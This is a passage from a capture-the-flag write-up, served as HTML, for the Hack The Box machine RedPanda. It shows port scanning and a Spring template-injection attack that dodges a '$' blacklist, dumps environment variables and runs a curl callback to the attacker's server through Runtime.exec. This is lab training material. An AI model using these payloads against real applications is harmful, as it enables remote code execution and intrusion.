@@ -1,0 +1,1015 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"><head>
+
+<meta charset="utf-8">
+<meta name="generator" content="quarto-1.5.45">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+
+<meta name="author" content="0xPThree">
+<meta name="dcterms.date" content="2022-08-16">
+<meta name="description" content="RedPanda is a very cute easy-rated Linux machine from Hack The Box. I can see why it’s rated as easy, but for someone with limited Java experience I found it a bit rough on the root part. But as long as you take it nice and easy, and really make sure to have all your ducks in a row, you will root it without too much headache. Personally I found this box to be quite fun with the short stories about the different red pandas. The box is short box and straight to the point which I also enjoy. In the end I didn’t learn anything new, but I definitely refined my code review skills in Java.">
+
+<title>RedPanda - Hack The Box</title>
+<style>
+code{white-space: pre-wrap;}
+span.smallcaps{font-variant: small-caps;}
+div.columns{display: flex; gap: min(4vw, 1.5em);}
+div.column{flex: auto; overflow-x: auto;}
+div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+ul.task-list{list-style: none;}
+ul.task-list li input[type="checkbox"] {
+  width: 0.8em;
+  margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
+  vertical-align: middle;
+}
+/* CSS for syntax highlighting */
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+.sourceCode { overflow: visible; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { display: inline-block; text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+  }
+pre.numberSource { margin-left: 3em;  padding-left: 4px; }
+div.sourceCode
+  {   }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
+</style>
+
+
+<script src="../../site_libs/quarto-nav/quarto-nav.js"></script>
+<script src="../../site_libs/quarto-nav/headroom.min.js"></script>
+<script src="../../site_libs/clipboard/clipboard.min.js"></script>
+<script src="../../site_libs/quarto-search/autocomplete.umd.js"></script>
+<script src="../../site_libs/quarto-search/fuse.min.js"></script>
+<script src="../../site_libs/quarto-search/quarto-search.js"></script>
+<meta name="quarto:offset" content="../../">
+<link href="../../favicon.ico" rel="icon">
+<script src="../../site_libs/quarto-html/quarto.js"></script>
+<script src="../../site_libs/quarto-html/popper.min.js"></script>
+<script src="../../site_libs/quarto-html/tippy.umd.min.js"></script>
+<script src="../../site_libs/quarto-html/anchor.min.js"></script>
+<link href="../../site_libs/quarto-html/tippy.css" rel="stylesheet">
+<link href="../../site_libs/quarto-html/quarto-syntax-highlighting.css" rel="stylesheet" id="quarto-text-highlighting-styles">
+<script src="../../site_libs/bootstrap/bootstrap.min.js"></script>
+<link href="../../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
+<link href="../../site_libs/bootstrap/bootstrap.min.css" rel="stylesheet" id="quarto-bootstrap" data-mode="light">
+<script id="quarto-search-options" type="application/json">{
+  "location": "navbar",
+  "copy-button": false,
+  "collapse-after": 3,
+  "panel-placement": "end",
+  "type": "overlay",
+  "limit": 50,
+  "keyboard-shortcut": [
+    "f",
+    "/",
+    "s"
+  ],
+  "show-item-context": false,
+  "language": {
+    "search-no-results-text": "No results",
+    "search-matching-documents-text": "matching documents",
+    "search-copy-link-title": "Copy link to search",
+    "search-hide-matches-text": "Hide additional matches",
+    "search-more-match-text": "more match in this document",
+    "search-more-matches-text": "more matches in this document",
+    "search-clear-button-title": "Clear",
+    "search-text-placeholder": "",
+    "search-detached-cancel-button-title": "Cancel",
+    "search-submit-button-title": "Submit",
+    "search-label": "Search"
+  }
+}</script>
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-XVW5CQ7DG5"></script>
+
+<script type="text/javascript">
+
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-XVW5CQ7DG5', { 'anonymize_ip': true});
+</script>
+
+
+<link rel="stylesheet" href="../../scss/styles.css">
+<link rel="stylesheet" href="../../scss/bootstrap-dark.min.css">
+<link rel="stylesheet" href="../../scss/quarto-syntax-highlighting-dark.css">
+<link rel="stylesheet" href="../../scss/bootstrap-icons.css">
+</head>
+
+<body class="nav-fixed">
+
+<div id="quarto-search-results"></div>
+  <header id="quarto-header" class="headroom fixed-top quarto-banner">
+    <nav class="navbar navbar-expand-lg " data-bs-theme="dark">
+      <div class="navbar-container container-fluid">
+      <div class="navbar-brand-container mx-auto">
+    <a href="../../index.html" class="navbar-brand navbar-brand-logo">
+    <img src="../../static/exploit_white-orange.png" alt="" class="navbar-logo">
+    </a>
+  </div>
+            <div id="quarto-search" class="" title="Search"></div>
+          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" role="menu" aria-expanded="false" aria-label="Toggle navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
+  <span class="navbar-toggler-icon"></span>
+</button>
+          <div class="collapse navbar-collapse" id="navbarCollapse">
+            <ul class="navbar-nav navbar-nav-scroll ms-auto">
+  <li class="nav-item">
+    <a class="nav-link" href="../../index.html"> 
+<span class="menu-text">Home</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="https://0xpthree.gitbook.io/notes"> 
+<span class="menu-text">Notes</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="../../about.html"> 
+<span class="menu-text">About</span></a>
+  </li>  
+</ul>
+          </div> <!-- /navcollapse -->
+            <div class="quarto-navbar-tools">
+</div>
+      </div> <!-- /container-fluid -->
+    </nav>
+</header>
+<!-- content -->
+<header id="title-block-header" class="quarto-title-block default page-columns page-full">
+  <div class="quarto-title-banner page-columns page-full">
+    <div class="quarto-title column-body">
+      <h1 class="title">RedPanda - Hack The Box</h1>
+                  <div>
+        <div class="description">
+          RedPanda is a very cute easy-rated Linux machine from Hack The Box. I can see why it’s rated as easy, but for someone with limited Java experience I found it a bit rough on the root part. But as long as you take it nice and easy, and really make sure to have all your ducks in a row, you will root it without too much headache. Personally I found this box to be quite fun with the short stories about the different red pandas. The box is short box and straight to the point which I also enjoy. In the end I didn’t learn anything new, but I definitely refined my code review skills in Java.
+        </div>
+      </div>
+                          <div class="quarto-categories">
+                <div class="quarto-category">hackthebox</div>
+                <div class="quarto-category">linux</div>
+                <div class="quarto-category">ssti</div>
+                <div class="quarto-category">java</div>
+                <div class="quarto-category">xxe</div>
+              </div>
+                  </div>
+  </div>
+    
+  
+  <div class="quarto-title-meta">
+
+      <div>
+      <div class="quarto-title-meta-heading">Author</div>
+      <div class="quarto-title-meta-contents">
+               <p>0xPThree </p>
+            </div>
+    </div>
+      
+      <div>
+      <div class="quarto-title-meta-heading">Published</div>
+      <div class="quarto-title-meta-contents">
+        <p class="date">August 16, 2022</p>
+      </div>
+    </div>
+    
+      
+    </div>
+    
+  
+  </header><div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article page-navbar">
+<!-- sidebar -->
+<!-- margin-sidebar -->
+    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar">
+        <nav id="TOC" role="doc-toc" class="toc-active">
+    <h2 id="toc-title">On this page</h2>
+   
+  <ul>
+  <li><a href="#user" id="toc-user" class="nav-link active" data-scroll-target="#user">USER</a>
+  <ul class="collapse">
+  <li><a href="#step-1" id="toc-step-1" class="nav-link" data-scroll-target="#step-1">Step 1</a></li>
+  <li><a href="#step-2" id="toc-step-2" class="nav-link" data-scroll-target="#step-2">Step 2</a></li>
+  </ul></li>
+  <li><a href="#root" id="toc-root" class="nav-link" data-scroll-target="#root">Root</a>
+  <ul class="collapse">
+  <li><a href="#step-1-1" id="toc-step-1-1" class="nav-link" data-scroll-target="#step-1-1">Step 1</a></li>
+  <li><a href="#step-2-1" id="toc-step-2-1" class="nav-link" data-scroll-target="#step-2-1">Step 2</a></li>
+  <li><a href="#references" id="toc-references" class="nav-link" data-scroll-target="#references">References</a></li>
+  </ul></li>
+  </ul>
+</nav>
+    </div>
+<!-- main -->
+<main class="content quarto-banner-title-block" id="quarto-document-content">
+
+
+
+
+
+<section id="user" class="level1">
+<h1>USER</h1>
+<section id="step-1" class="level3">
+<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
+<p><strong>nmap:</strong></p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  redpanda nmap <span class="at">-Pn</span> <span class="at">-n</span> <span class="at">-p-</span> 10.10.11.170</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Starting</span> Nmap 7.92 <span class="er">(</span> <span class="ex">https://nmap.org</span> <span class="kw">)</span> <span class="ex">at</span> 2022-08-15 20:25 CEST</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Nmap</span> scan report for 10.10.11.170</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Host</span> is up <span class="er">(</span><span class="ex">0.032s</span> latency<span class="kw">)</span><span class="bu">.</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Not</span> shown: 65533 closed tcp ports <span class="er">(</span><span class="ex">conn-refused</span><span class="kw">)</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>     STATE SERVICE</span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="ex">22/tcp</span>   open  ssh</span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="ex">8080/tcp</span> open  http-proxy</span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  redpanda nmap <span class="at">-Pn</span> <span class="at">-n</span> <span class="at">-sCV</span> <span class="at">-p22,8080</span> 10.10.11.170 <span class="at">--open</span></span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>     STATE SERVICE    VERSION</span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a><span class="ex">22/tcp</span>   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="er">(</span><span class="ex">Ubuntu</span> Linux<span class="kw">;</span> <span class="ex">protocol</span> 2.0<span class="kw">)</span></span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">ssh-hostkey:</span> </span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>   <span class="ex">3072</span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span class="er">(</span><span class="ex">RSA</span><span class="kw">)</span></span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>   <span class="ex">256</span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span class="er">(</span><span class="ex">ECDSA</span><span class="kw">)</span></span>
+<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_</span>  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span class="er">(</span><span class="ex">ED25519</span><span class="kw">)</span></span>
+<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a><span class="ex">8080/tcp</span> open  http-proxy</span>
+<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">fingerprint-strings:</span> </span>
+<span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>   <span class="ex">GetRequest:</span> </span>
+<span id="cb1-21"><a href="#cb1-21" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="ex">HTTP/1.1</span> 200 </span>
+<span id="cb1-22"><a href="#cb1-22" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="ex">Content-Type:</span> text/html<span class="kw">;</span><span class="va">charset</span><span class="op">=</span>UTF-8</span>
+<span id="cb1-23"><a href="#cb1-23" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="ex">Content-Language:</span> en-US</span>
+<span id="cb1-24"><a href="#cb1-24" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="ex">Date:</span> Mon, 15 Aug 2022 18:26:55 GMT</span>
+<span id="cb1-25"><a href="#cb1-25" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="ex">Connection:</span> close</span>
+<span id="cb1-26"><a href="#cb1-26" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="op">&lt;</span>!DOCTYPE <span class="ex">html</span><span class="op">&gt;</span></span>
+<span id="cb1-27"><a href="#cb1-27" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="op">&lt;</span>html <span class="va">lang</span><span class="op">=</span><span class="st">"en"</span> <span class="va">dir</span><span class="op">=</span><span class="st">"ltr"</span><span class="op">&gt;</span></span>
+<span id="cb1-28"><a href="#cb1-28" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="op">&lt;</span>head<span class="op">&gt;</span></span>
+<span id="cb1-29"><a href="#cb1-29" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="op">&lt;</span>meta <span class="va">charset</span><span class="op">=</span><span class="st">"utf-8"</span><span class="op">&gt;</span></span>
+<span id="cb1-30"><a href="#cb1-30" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="op">&lt;</span>meta <span class="va">author</span><span class="op">=</span><span class="st">"wooden_k"</span><span class="op">&gt;</span></span>
+<span id="cb1-31"><a href="#cb1-31" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="op">&lt;</span>!--Codepen <span class="ex">by</span> khr2003: https://codepen.io/khr2003/pen/BGZdXw <span class="at">--</span><span class="op">&gt;</span></span>
+<span id="cb1-32"><a href="#cb1-32" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="op">&lt;</span>link <span class="va">rel</span><span class="op">=</span><span class="st">"stylesheet"</span> <span class="va">href</span><span class="op">=</span><span class="st">"css/panda.css"</span> <span class="va">type</span><span class="op">=</span><span class="st">"text/css"</span><span class="op">&gt;</span></span>
+<span id="cb1-33"><a href="#cb1-33" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="op">&lt;</span>link <span class="va">rel</span><span class="op">=</span><span class="st">"stylesheet"</span> <span class="va">href</span><span class="op">=</span><span class="st">"css/main.css"</span> <span class="va">type</span><span class="op">=</span><span class="st">"text/css"</span><span class="op">&gt;</span></span>
+<span id="cb1-34"><a href="#cb1-34" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="op">&lt;</span>title<span class="op">&gt;</span>Red <span class="ex">Panda</span> Search <span class="kw">|</span> <span class="ex">Made</span> with Spring Boot<span class="op">&lt;</span>/title<span class="op">&gt;</span></span>
+<span id="cb1-35"><a href="#cb1-35" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="op">&lt;</span>/head<span class="op">&gt;</span></span>
+<span id="cb1-36"><a href="#cb1-36" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="op">&lt;</span>body<span class="op">&gt;</span></span>
+<span id="cb1-37"><a href="#cb1-37" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="op">&lt;</span>div <span class="va">class</span><span class="op">=</span><span class="st">'pande'</span><span class="op">&gt;</span></span>
+<span id="cb1-38"><a href="#cb1-38" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="op">&lt;</span>div <span class="va">class</span><span class="op">=</span><span class="st">'ear left'</span><span class="op">&gt;&lt;</span>/div<span class="op">&gt;</span></span>
+<span id="cb1-39"><a href="#cb1-39" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="op">&lt;</span>div <span class="va">class</span><span class="op">=</span><span class="st">'ear right'</span><span class="op">&gt;&lt;</span>/div<span class="op">&gt;</span></span>
+<span id="cb1-40"><a href="#cb1-40" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="op">&lt;</span>div <span class="va">class</span><span class="op">=</span><span class="st">'whiskers left'</span><span class="op">&gt;</span></span>
+<span id="cb1-41"><a href="#cb1-41" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="op">&lt;</span>span<span class="op">&gt;&lt;</span>/span<span class="op">&gt;</span></span>
+<span id="cb1-42"><a href="#cb1-42" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="op">&lt;</span>span<span class="op">&gt;&lt;</span>/span<span class="op">&gt;</span></span>
+<span id="cb1-43"><a href="#cb1-43" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="op">&lt;</span>span<span class="op">&gt;&lt;</span>/span<span class="op">&gt;</span></span>
+<span id="cb1-44"><a href="#cb1-44" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="op">&lt;</span>/div<span class="op">&gt;</span></span>
+<span id="cb1-45"><a href="#cb1-45" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="op">&lt;</span>div <span class="va">class</span><span class="op">=</span><span class="st">'whiskers right'</span><span class="op">&gt;</span></span>
+<span id="cb1-46"><a href="#cb1-46" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="op">&lt;</span>span<span class="op">&gt;&lt;</span>/span<span class="op">&gt;</span></span>
+<span id="cb1-47"><a href="#cb1-47" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="op">&lt;</span>span<span class="op">&gt;&lt;</span>/span<span class="op">&gt;</span></span>
+<span id="cb1-48"><a href="#cb1-48" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="op">&lt;</span>span<span class="op">&gt;&lt;</span>/span<span class="op">&gt;</span></span>
+<span id="cb1-49"><a href="#cb1-49" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="op">&lt;</span>/div<span class="op">&gt;</span></span>
+<span id="cb1-50"><a href="#cb1-50" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="op">&lt;</span>div <span class="va">class</span><span class="op">=</span><span class="st">'face'</span><span class="op">&gt;</span></span>
+<span id="cb1-51"><a href="#cb1-51" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="op">&lt;</span>div <span class="va">class</span><span class="op">=</span><span class="st">'eye</span></span>
+<span id="cb1-52"><a href="#cb1-52" aria-hidden="true" tabindex="-1"></a><span class="st">|   HTTPOptions: </span></span>
+<span id="cb1-53"><a href="#cb1-53" aria-hidden="true" tabindex="-1"></a><span class="st">|     HTTP/1.1 200 </span></span>
+<span id="cb1-54"><a href="#cb1-54" aria-hidden="true" tabindex="-1"></a><span class="st">|     Allow: GET,HEAD,OPTIONS</span></span>
+<span id="cb1-55"><a href="#cb1-55" aria-hidden="true" tabindex="-1"></a><span class="st">|     Content-Length: 0</span></span>
+<span id="cb1-56"><a href="#cb1-56" aria-hidden="true" tabindex="-1"></a><span class="st">|     Date: Mon, 15 Aug 2022 18:26:55 GMT</span></span>
+<span id="cb1-57"><a href="#cb1-57" aria-hidden="true" tabindex="-1"></a><span class="st">|     Connection: close</span></span>
+<span id="cb1-58"><a href="#cb1-58" aria-hidden="true" tabindex="-1"></a><span class="st">|   RTSPRequest: </span></span>
+<span id="cb1-59"><a href="#cb1-59" aria-hidden="true" tabindex="-1"></a><span class="st">|     HTTP/1.1 400 </span></span>
+<span id="cb1-60"><a href="#cb1-60" aria-hidden="true" tabindex="-1"></a><span class="st">|     Content-Type: text/html;charset=utf-8</span></span>
+<span id="cb1-61"><a href="#cb1-61" aria-hidden="true" tabindex="-1"></a><span class="st">|     Content-Language: en</span></span>
+<span id="cb1-62"><a href="#cb1-62" aria-hidden="true" tabindex="-1"></a><span class="st">|     Content-Length: 435</span></span>
+<span id="cb1-63"><a href="#cb1-63" aria-hidden="true" tabindex="-1"></a><span class="st">|     Date: Mon, 15 Aug 2022 18:26:55 GMT</span></span>
+<span id="cb1-64"><a href="#cb1-64" aria-hidden="true" tabindex="-1"></a><span class="st">|     Connection: close</span></span>
+<span id="cb1-65"><a href="#cb1-65" aria-hidden="true" tabindex="-1"></a><span class="st">|     &lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 </span></span>
+<span id="cb1-66"><a href="#cb1-66" aria-hidden="true" tabindex="-1"></a><span class="st">|     Request&lt;/title&gt;&lt;style type="text/css"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 </span></span>
+<span id="cb1-67"><a href="#cb1-67" aria-hidden="true" tabindex="-1"></a><span class="st">|_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</span></span>
+<span id="cb1-68"><a href="#cb1-68" aria-hidden="true" tabindex="-1"></a><span class="st">|_http-title: Red Panda Search | Made with Spring Boot</span></span>
+<span id="cb1-69"><a href="#cb1-69" aria-hidden="true" tabindex="-1"></a><span class="st">|_http-open-proxy: Proxy might be redirecting requests</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Visiting port 8080 we find the RedPanda search page, where we can search for different pandas.</p>
+<p><img src="images/redpanda01.png" class="img-fluid"></p>
+<p>Since this is an easy box, lets just search for something random, capture it in Burp and throw whatever we got at it; SQLi, SSTI, XXE etc.</p>
+<p>With SSTI we find something interesting: <img src="images/redpanda02.png" class="img-fluid"> <img src="images/redpanda03.png" class="img-fluid"></p>
+</section>
+<section id="step-2" class="level3">
+<h3 class="anchored" data-anchor-id="step-2">Step 2</h3>
+<p>Both <code>@(6+5)</code> and <code>#{3*3}</code> is calculated however everything starting with <code>$</code> is blacklisted.. Looking on the syntax we can figure out that the backend is java, which is also seen in the website title (<em>“Made with Spring Boot”</em>).</p>
+<p>We can bypass this blacklist by replacing <code>$</code> with <code>*</code> instead, and are now able to extract some environment information:</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="co">## Request</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">POST</span> /search HTTP/1.1</span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Host:</span> 10.10.11.170:8080</span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="ex">User-Agent:</span> Mozilla/5.0 <span class="er">(</span><span class="ex">X11</span><span class="kw">;</span> <span class="ex">Linux</span> x86_64<span class="kw">;</span> <span class="ex">rv:91.0</span><span class="kw">)</span> <span class="ex">Gecko/20100101</span> Firefox/91.0</span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Accept:</span> text/html,application/xhtml+xml,application/xml<span class="kw">;</span><span class="va">q</span><span class="op">=</span>0.9,image/webp,<span class="pp">*</span>/<span class="pp">*</span><span class="kw">;</span><span class="va">q</span><span class="op">=</span>0.8</span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Accept-Language:</span> en-US,en<span class="kw">;</span><span class="va">q</span><span class="op">=</span>0.5</span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Accept-Encoding:</span> gzip, deflate</span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a><span class="ex">Content-Type:</span> application/x-www-form-urlencoded</span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a><span class="ex">Content-Length:</span> 36</span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a><span class="ex">Origin:</span> http://10.10.11.170:8080</span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a><span class="ex">Connection:</span> close</span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a><span class="ex">Referer:</span> http://10.10.11.170:8080/</span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a><span class="ex">Upgrade-Insecure-Requests:</span> 1</span>
+<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a><span class="va">name</span><span class="op">=</span><span class="pp">*</span>{T<span class="kw">(</span><span class="ex">java.lang.System</span><span class="kw">)</span><span class="fu">.getenv()</span><span class="er">}</span></span>
+<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a><span class="co">## Response:</span></span>
+<span id="cb2-18"><a href="#cb2-18" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
+<span id="cb2-19"><a href="#cb2-19" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>h2 <span class="va">class</span><span class="op">=</span><span class="st">"searched"</span><span class="op">&gt;</span></span>
+<span id="cb2-20"><a href="#cb2-20" aria-hidden="true" tabindex="-1"></a><span class="ex">You</span> searched for: {PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, SHELL=/bin/bash, JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64, TERM=unknown, USER=woodenk, LANG=en_US.UTF-8, SUDO_USER=root, SUDO_COMMAND=/usr/bin/java <span class="at">-jar</span> /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar, SUDO_GID=0, MAIL=/var/mail/woodenk, LOGNAME=woodenk, SUDO_UID=0, HOME=/home/woodenk}</span>
+<span id="cb2-21"><a href="#cb2-21" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>/h2<span class="op">&gt;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Going to Github <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java">PayloadAllTheThings</a> we find a one-liner to execute commands, and with this we’re able get callbacks from the victim:</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co">## Request</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="va">name</span><span class="op">=</span><span class="pp">*</span>{T<span class="kw">(</span><span class="ex">java.lang.Runtime</span><span class="kw">)</span><span class="fu">.getRuntime()</span><span class="ex">.exec</span><span class="er">(</span><span class="st">'curl http://10.10.14.6/test'</span><span class="kw">)</span><span class="er">}</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="co">## Callback</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  redpanda python3 <span class="at">-m</span> http.server 80</span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Serving</span> HTTP on 0.0.0.0 port 80 <span class="er">(</span><span class="ex">http://0.0.0.0:80/</span><span class="kw">)</span> <span class="ex">...</span></span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a><span class="ex">10.10.11.170</span> <span class="at">-</span> <span class="at">-</span> [15/Aug/2022 21:37:09] code 404, message File not found</span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a><span class="ex">10.10.11.170</span> <span class="at">-</span> <span class="at">-</span> [15/Aug/2022 21:37:09] <span class="st">"GET /test HTTP/1.1"</span> 404 <span class="at">-</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Trying a bunch of one-liners fails, I am not able to get a reverse shell. So instead we go to create a payload and upload it to the victim.</p>
